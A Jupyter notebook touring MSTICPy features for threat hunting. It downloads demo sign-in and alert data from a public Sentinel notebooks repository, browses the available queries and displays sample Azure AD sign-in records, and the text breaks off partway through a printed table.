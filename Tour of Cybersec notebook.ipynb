{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1ec99e72",
   "metadata": {},
   "source": [
    "# Intro to Cybersec Notebook Features"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "50b60cd4",
   "metadata": {},
   "source": [
    "## Part 1 - Querying data from Sentinel"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "610e4149",
   "metadata": {},
   "outputs": [],
   "source": [
    "# MSTICPy initialization\n",
    "import msticpy as mp\n",
    "from msticpy import nbwidgets\n",
    "mp.init_notebook(\n",
    "    namespace=globals(),\n",
    "    extra_imports=[\"urllib.request, urlretrieve\"],\n",
    "    friendly_exceptions=False\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "0c602df3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0a292a2afa6448cc80045ff037287ab5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Label(value='Choose the data source'), HBox(children=(Button(description='Microsoft Sentinel', …"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "data_opt = nbwidgets.OptionButtons(\n",
    "    description=\"Choose the data source\",\n",
    "    buttons=[\"Microsoft Sentinel\", \"Demo data\"],\n",
    "    default=\"Demo data\",\n",
    "    timeout=15,\n",
    ")\n",
    "await data_opt.display_async()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "cfa457a8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Downloading sample files...\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "703e8f3478624a808f68f2bc57585ec6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "File downloads:   0%|          | 0/7 [00:00<?, ?file/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Files downloaded: exchange_admin.pkl, processes_on_host.pkl, timeseries.pkl, data_queries.yaml, aad_logons.pkl, host_logons.pkl, alerts_list.pkl\n",
      "Local data query provider loaded.\n",
      "Connected.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "        <div style=\"color: White; background-color: DarkOliveGreen; padding: 5px\">\n",
       "        <p style=\"font-size: 20px\">Using local data as primary data source.</p>\n",
       "        </div>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from urllib.request import urlretrieve\n",
    "from pathlib import Path\n",
    "from IPython.display import HTML\n",
    "from tqdm.auto import tqdm\n",
    "import pandas as pd\n",
    "\n",
    "GH_URI = \"https://raw.githubusercontent.com/Azure/Azure-Sentinel-Notebooks/master/{file_name}\"\n",
    "GH_FILES = {\n",
    "    \"exchange_admin.pkl\": \"src/data\",\n",
    "    \"processes_on_host.pkl\": \"src/data\",\n",
    "    \"timeseries.pkl\": \"src/data\",\n",
    "    \"data_queries.yaml\": \"src/data\",\n",
    "    \"aad_logons.pkl\": \"src/data\",\n",
    "    \"host_logons.pkl\": \"src/data\",\n",
    "    \"alerts_list.pkl\": \"src/data\",\n",
    "}\n",
    "\n",
    "def _get_gh_files(files):\n",
    "    tgt_path = Path(\"./asn_data\")\n",
    "    tgt_path.mkdir(exist_ok=True)\n",
    "    for file, path in tqdm(files.items(), desc=\"File downloads\", unit=\"file\"):\n",
    "        file_path = tgt_path.joinpath(file)\n",
    "        if file_path.is_file():\n",
    "            continue\n",
    "        url_path = f\"{path}/{file}\" if path else file\n",
    "        urlretrieve(\n",
    "            GH_URI.format(file_name=url_path),\n",
    "            file_path\n",
    "        )\n",
    "    print(\"Files downloaded:\", \", \".join(files.keys()))\n",
    "\n",
    "def _update_timestamps(file):\n",
    "    if not file.endswith(\".pkl\"):\n",
    "        return\n",
    "    data = pd.read_pickle(file)\n",
    "    date_cols = data.select_dtypes('datetime').columns\n",
    "    for col in date_cols:\n",
    "        now_delta = pd.Timestamp(\"now\") - data[col].max()\n",
    "        data[col] = data[col] + now_delta\n",
    "    if not date_cols.empty:\n",
    "        data.to_pickle(file)\n",
    "\n",
    "print(\"Downloading sample files...\")\n",
    "_get_gh_files(GH_FILES)\n",
    "for file in GH_FILES:\n",
    "    _update_timestamps(f\"./asn_data/{file}\")\n",
    "\n",
    "# create local data provider\n",
    "qry_prov = QueryProvider(\"LocalData\", data_paths=[\"./asn_data\"], query_paths=[\"./asn_data\"])\n",
    "print(\"Local data query provider loaded.\")\n",
    "qry_prov.connect()\n",
    "\n",
    "# create Sentinel\n",
    "qry_prov_azs = QueryProvider(\"AzureSentinel\")\n",
    "\n",
    "if data_opt.value and data_opt.value.casefold() != \"demo data\":\n",
    "    # create Sentinel provider and connect\n",
    "    qry_prov_loc = qry_prov\n",
    "    qry_prov = qry_prov_azs\n",
    "    display(HTML(\"\"\"\n",
    "                 <div style=\"color: White; backgroud-color: DarkOliveGreen; padding: 5px\">\n",
    "                 <p stype=\"font-size: 20px\">Using Sentinel as primary data source.</p>\n",
    "                 <p>Please copy the code and click on the URL to authenticate to Sentinel if prompted to do so.</p>\n",
    "                 </div>\n",
    "                 \"\"\"\n",
    "    ))\n",
    "    qry_prov.connect(WorkspaceConfig())\n",
    "else:\n",
    "    display(HTML(\"\"\"\n",
    "        <div style=\"color: White; background-color: DarkOliveGreen; padding: 5px\">\n",
    "        <p style=\"font-size: 20px\">Using local data as primary data source.</p>\n",
    "        </div>\n",
    "        \"\"\"\n",
    "    ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "8addb467",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['aad_logons.pkl',\n",
       " 'alerts_list.pkl',\n",
       " 'exchange_admin.pkl',\n",
       " 'host_logons.pkl',\n",
       " 'processes_on_host.pkl',\n",
       " 'timeseries.pkl']"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Sentinel data schema\n",
    "qry_prov.schema_tables[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "8bea268f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/markdown": [
       "Note: this is the schema of a local pandas DataFrame that emulates the Sentinel schema."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "TenantId                                     object\n",
       "SourceSystem                                 object\n",
       "TimeGenerated                        datetime64[ns]\n",
       "ResourceId                                   object\n",
       "OperationName                                object\n",
       "OperationVersion                            float64\n",
       "Category                                     object\n",
       "ResultType                                    int64\n",
       "ResultSignature                              object\n",
       "ResultDescription                            object\n",
       "DurationMs                                    int64\n",
       "CorrelationId                                object\n",
       "Resource                                     object\n",
       "ResourceGroup                                object\n",
       "ResourceProvider                            float64\n",
       "Identity                                     object\n",
       "Level                                         int64\n",
       "Location                                     object\n",
       "AlternateSignInName                          object\n",
       "AppDisplayName                               object\n",
       "AppId                                        object\n",
       "AuthenticationDetails                        object\n",
       "AuthenticationMethodsUsed                   float64\n",
       "AuthenticationProcessingDetails              object\n",
       "AuthenticationRequirement                    object\n",
       "AuthenticationRequirementPolicies            object\n",
       "ClientAppUsed                                object\n",
       "ConditionalAccessPolicies                    object\n",
       "ConditionalAccessStatus                      object\n",
       "CreatedDateTime                              object\n",
       "DeviceDetail                                 object\n",
       "IsInteractive                                  bool\n",
       "Id                                           object\n",
       "IPAddress                                    object\n",
       "IsRisky                                     float64\n",
       "LocationDetails                              object\n",
       "MfaDetail                                    object\n",
       "NetworkLocationDetails                       object\n",
       "OriginalRequestId                            object\n",
       "ProcessingTimeInMilliseconds                  int64\n",
       "RiskDetail                                   object\n",
       "RiskEventTypes                               object\n",
       "RiskEventTypes_V2                            object\n",
       "RiskLevelAggregated                          object\n",
       "RiskLevelDuringSignIn                        object\n",
       "RiskState                                    object\n",
       "ResourceDisplayName                          object\n",
       "ResourceIdentity                             object\n",
       "ServicePrincipalId                          float64\n",
       "ServicePrincipalName                        float64\n",
       "Status                                       object\n",
       "TokenIssuerName                             float64\n",
       "TokenIssuerType                              object\n",
       "UserAgent                                    object\n",
       "UserDisplayName                              object\n",
       "UserId                                       object\n",
       "UserPrincipalName                            object\n",
       "AADTenantId                                  object\n",
       "Type                                         object\n",
       "Result                                       object\n",
       "Latitude                                    float64\n",
       "Longitude                                   float64\n",
       "dtype: object"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "def md(text: str):\n",
    "    display(Markdown(text))\n",
    "\n",
    "if qry_prov.environment == \"AzureSentinel\":\n",
    "    print(qry_prov.schema['SigninLogs'])\n",
    "else:\n",
    "    md(\n",
    "        \"Note: this is the schema of a local pandas DataFrame that emulates the Sentinel schema.\"\n",
    "    )\n",
    "    display(qry_prov.Azure.list_all_signins_geo().dtypes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "e022fef4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "70c7c67f0460418c920f36b81815dce7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(Text(value='Azure.get_vmcomputer_for_host', description='Filter:', style=TextStyle(description_…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h3>Returns most recent VMComputer record for Host</h3><div></div><p><b>Parameters</b></p><div>add_query_items: str (optional)</div><div style='margin-left: 40px'>    Additional query clauses</div><div>end: datetime</div><div style='margin-left: 40px'>    Query end time</div><div>host_name: str</div><div style='margin-left: 40px'>    The Computer name of the VM</div><div>start: datetime</div><div style='margin-left: 40px'>    Query start time</div><div>table: str (optional)</div><div style='margin-left: 40px'>    Table name</div><div style='margin-left: 40px'>    (default value is: VMComputer)</div><br><p><b>Query</b></p><pre>{table} \n",
       "| where TimeGenerated >= datetime({start}) \n",
       "| where TimeGenerated <= datetime({end}) \n",
       "| where Computer has \"{host_name}\" \n",
       "| take 1</pre><br>\n",
       "        <p><b>Example</b></p>\n",
       "        <p>{QueryProvider}[.QueryPath].QueryName(params...)</p>\n",
       "        <pre>qry_prov.Azure.get_vmcomputer_for_host(start=start, end=end, hostname=host)</pre>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "qry_prov_azs.browse_queries()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "4c531e5f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1bfc0e90cb5f44ae993d6c5c7c1a69a9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(HTML(value='<h4>Set query time boundaries</h4>'), HBox(children=(DatePicker(value=datetime.date…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "qry_prov.query_time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "00468468",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>SourceSystem</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>ResourceId</th>\n",
       "      <th>OperationName</th>\n",
       "      <th>OperationVersion</th>\n",
       "      <th>Category</th>\n",
       "      <th>ResultType</th>\n",
       "      <th>ResultSignature</th>\n",
       "      <th>ResultDescription</th>\n",
       "      <th>DurationMs</th>\n",
       "      <th>CorrelationId</th>\n",
       "      <th>Resource</th>\n",
       "      <th>ResourceGroup</th>\n",
       "      <th>ResourceProvider</th>\n",
       "      <th>Identity</th>\n",
       "      <th>Level</th>\n",
       "      <th>Location</th>\n",
       "      <th>AlternateSignInName</th>\n",
       "      <th>AppDisplayName</th>\n",
       "      <th>AppId</th>\n",
       "      <th>AuthenticationDetails</th>\n",
       "      <th>AuthenticationMethodsUsed</th>\n",
       "      <th>AuthenticationProcessingDetails</th>\n",
       "      <th>AuthenticationRequirement</th>\n",
       "      <th>...</th>\n",
       "      <th>NetworkLocationDetails</th>\n",
       "      <th>OriginalRequestId</th>\n",
       "      <th>ProcessingTimeInMilliseconds</th>\n",
       "      <th>RiskDetail</th>\n",
       "      <th>RiskEventTypes</th>\n",
       "      <th>RiskEventTypes_V2</th>\n",
       "      <th>RiskLevelAggregated</th>\n",
       "      <th>RiskLevelDuringSignIn</th>\n",
       "      <th>RiskState</th>\n",
       "      <th>ResourceDisplayName</th>\n",
       "      <th>ResourceIdentity</th>\n",
       "      <th>ServicePrincipalId</th>\n",
       "      <th>ServicePrincipalName</th>\n",
       "      <th>Status</th>\n",
       "      <th>TokenIssuerName</th>\n",
       "      <th>TokenIssuerType</th>\n",
       "      <th>UserAgent</th>\n",
       "      <th>UserDisplayName</th>\n",
       "      <th>UserId</th>\n",
       "      <th>UserPrincipalName</th>\n",
       "      <th>AADTenantId</th>\n",
       "      <th>Type</th>\n",
       "      <th>Result</th>\n",
       "      <th>Latitude</th>\n",
       "      <th>Longitude</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 18:53:49.241233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>singleFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>[]</td>\n",
       "      <td>f05079ed-f820-4531-ab26-498b53af3800</td>\n",
       "      <td>366</td>\n",
       "      <td>none</td>\n",
       "      <td>[]</td>\n",
       "      <td>[]</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>Windows Azure Service Management API</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n",
       "      <td>ctfuser3@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>42.997181</td>\n",
       "      <td>-86.848312</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 19:07:29.645233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>d5ef0f81-318f-4881-8df1-8415aab77d1a</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>[]</td>\n",
       "      <td>121dca00-0930-40fe-9b69-bbc1e33c3500</td>\n",
       "      <td>394</td>\n",
       "      <td>none</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>Windows Azure Service Management API</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>2566a1a6-4d03-40d2-8836-6c8cf1ce517f</td>\n",
       "      <td>zvon@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>48.614380</td>\n",
       "      <td>-121.110313</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 19:07:29.645233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>d5ef0f81-318f-4881-8df1-8415aab77d1a</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>singleFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>[]</td>\n",
       "      <td>121dca00-0930-40fe-9b69-bbc1e33c3500</td>\n",
       "      <td>394</td>\n",
       "      <td>none</td>\n",
       "      <td>[]</td>\n",
       "      <td>[]</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>Windows Azure Service Management API</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>Zack Von</td>\n",
       "      <td>2566a1a6-4d03-40d2-8836-6c8cf1ce517f</td>\n",
       "      <td>zvon@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>48.614380</td>\n",
       "      <td>-121.110313</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 18:53:49.241233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>[]</td>\n",
       "      <td>f05079ed-f820-4531-ab26-498b53af3800</td>\n",
       "      <td>366</td>\n",
       "      <td>none</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>Windows Azure Service Management API</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.404...</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n",
       "      <td>ctfuser3@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>42.997181</td>\n",
       "      <td>-86.848312</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>37</th>\n",
       "      <td>ab86c959-1ba3-495c-a00d-ced30d8825d3</td>\n",
       "      <td>Azure AD</td>\n",
       "      <td>2025-08-15 17:40:20.627233</td>\n",
       "      <td>/tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam</td>\n",
       "      <td>Sign-in activity</td>\n",
       "      <td>1.0</td>\n",
       "      <td>SignInLogs</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "      <td>NaN</td>\n",
       "      <td>0</td>\n",
       "      <td>bf124019-b325-4a4a-81ff-6c2823461620</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>Microsoft.aadiam</td>\n",
       "      <td>NaN</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>4</td>\n",
       "      <td>US</td>\n",
       "      <td>NaN</td>\n",
       "      <td>Azure Portal</td>\n",
       "      <td>c44b4083-3bb0-49c1-b47d-974e53cbdf3c</td>\n",
       "      <td>[]</td>\n",
       "      <td>NaN</td>\n",
       "      <td>[\\r\\n  {\\r\\n    \"key\": \"Login Hint Present\",\\r\\n    \"value\": \"True\"\\r\\n  }\\r\\n]</td>\n",
       "      <td>singleFactorAuthentication</td>\n",
       "      <td>...</td>\n",
       "      <td>[]</td>\n",
       "      <td>39f36cc7-ad3e-430c-bf78-bc96fbc33300</td>\n",
       "      <td>553</td>\n",
       "      <td>none</td>\n",
       "      <td>[]</td>\n",
       "      <td>[]</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>none</td>\n",
       "      <td>Windows Azure Service Management API</td>\n",
       "      <td>797f4846-ba00-4fd7-ba43-dac1f8f63013</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>{'errorCode': 0}</td>\n",
       "      <td>NaN</td>\n",
       "      <td>AzureAD</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safa...</td>\n",
       "      <td>CTFUser3</td>\n",
       "      <td>acc49186-e946-4f6c-85af-669807da0e0f</td>\n",
       "      <td>ctfuser3@seccxp.ninja</td>\n",
       "      <td>4b2462a4-bbee-495a-a0e1-f23ae524cc9c</td>\n",
       "      <td>SigninLogs</td>\n",
       "      <td>Sucess</td>\n",
       "      <td>41.465630</td>\n",
       "      <td>-73.610718</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 62 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                TenantId SourceSystem  \\\n",
       "2   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "3   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "9   ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "22  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "37  ab86c959-1ba3-495c-a00d-ced30d8825d3     Azure AD   \n",
       "\n",
       "                TimeGenerated  \\\n",
       "2  2025-08-15 18:53:49.241233   \n",
       "3  2025-08-15 19:07:29.645233   \n",
       "9  2025-08-15 19:07:29.645233   \n",
       "22 2025-08-15 18:53:49.241233   \n",
       "37 2025-08-15 17:40:20.627233   \n",
       "\n",
       "                                                                  ResourceId  \\\n",
       "2   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "3   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "9   /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "22  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "37  /tenants/4b2462a4-bbee-495a-a0e1-f23ae524cc9c/providers/Microsoft.aadiam   \n",
       "\n",
       "       OperationName  OperationVersion    Category  ResultType  \\\n",
       "2   Sign-in activity               1.0  SignInLogs           0   \n",
       "3   Sign-in activity               1.0  SignInLogs           0   \n",
       "9   Sign-in activity               1.0  SignInLogs           0   \n",
       "22  Sign-in activity               1.0  SignInLogs           0   \n",
       "37  Sign-in activity               1.0  SignInLogs           0   \n",
       "\n",
       "   ResultSignature ResultDescription  DurationMs  \\\n",
       "2             None               NaN           0   \n",
       "3             None               NaN           0   \n",
       "9             None               NaN           0   \n",
       "22            None               NaN           0   \n",
       "37            None               NaN           0   \n",
       "\n",
       "                           CorrelationId          Resource     ResourceGroup  \\\n",
       "2   c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380  Microsoft.aadiam  Microsoft.aadiam   \n",
       "3   d5ef0f81-318f-4881-8df1-8415aab77d1a  Microsoft.aadiam  Microsoft.aadiam   \n",
       "9   d5ef0f81-318f-4881-8df1-8415aab77d1a  Microsoft.aadiam  Microsoft.aadiam   \n",
       "22  c4b4ea3c-58ff-4e0e-b5b0-d2ea01cce380  Microsoft.aadiam  Microsoft.aadiam   \n",
       "37  bf124019-b325-4a4a-81ff-6c2823461620  Microsoft.aadiam  Microsoft.aadiam   \n",
       "\n",
       "    ResourceProvider  Identity  Level Location AlternateSignInName  \\\n",
       "2                NaN  CTFUser3      4       US                 NaN   \n",
       "3                NaN  Zack Von      4       US                 NaN   \n",
       "9                NaN  Zack Von      4       US                 NaN   \n",
       "22               NaN  CTFUser3      4       US                 NaN   \n",
       "37               NaN  CTFUser3      4       US                 NaN   \n",
       "\n",
       "   AppDisplayName                                 AppId AuthenticationDetails  \\\n",
       "2    Azure Portal  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "3    Azure Portal  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "9    Azure Portal  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "22   Azure Portal  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "37   Azure Portal  c44b4083-3bb0-49c1-b47d-974e53cbdf3c                    []   \n",
       "\n",
       "    AuthenticationMethodsUsed  \\\n",
       "2                         NaN   \n",
       "3                         NaN   \n",
       "9                         NaN   \n",
       "22                        NaN   \n",
       "37                        NaN   \n",
       "\n",
       "                                                    AuthenticationProcessingDetails  \\\n",
       "2                                                                                []   \n",
       "3                                                                                []   \n",
